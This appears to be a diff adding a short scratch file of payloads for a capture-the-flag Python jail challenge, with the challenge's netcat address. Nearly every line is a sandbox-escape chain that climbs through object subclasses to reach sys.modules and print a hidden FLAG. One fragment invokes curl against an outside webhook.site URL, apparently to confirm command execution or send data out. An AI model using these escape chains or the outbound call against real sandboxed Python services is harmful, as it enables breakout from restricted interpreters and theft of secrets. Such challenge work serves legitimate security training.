@@ -1,0 +1,14 @@
+nc challs.nusgreyhats.org 33401
+
+(''.__class__.mro()[1].__subclasses__()[0])
+if 'Pop' in a.__name__
+(['curl', 'https://webhook.site/928039f6-43f5-49f2-8b28-b6d4ee9295ee'])
+
+
+([a for a in ''.__class__.mro()[1].__subclasses__() if 'WarningMessage' in a.__name__][0].__init__.__globals__['sys'].modules['builtins'].print([a for a in ''.__class__.mro()[1].__subclasses__() if 'WarningMessage' in a.__name__][0].__init__.__globals__['sys'].modules['__main__'].FLAG))
+
+(''.__class__.mro()[1].__subclasses__()[147].__init__.__globals__['sys'].modules['builtins'].print(''.__class__.mro()[1].__subclasses__()[147].__init__.__globals__['sys'].modules['__main__'].FLAG))
+
+(w:=''.__class__.mro()[1].__subclasses__()[0],w.__init__.__globals__['sys'].modules['builtins'].print(w.__init__.__globals__['sys'].modules['__main__'].FLAG))
+
+(challenge.__globals__["__builtins__"].print(challenge.__globals__["__builtins__"]))
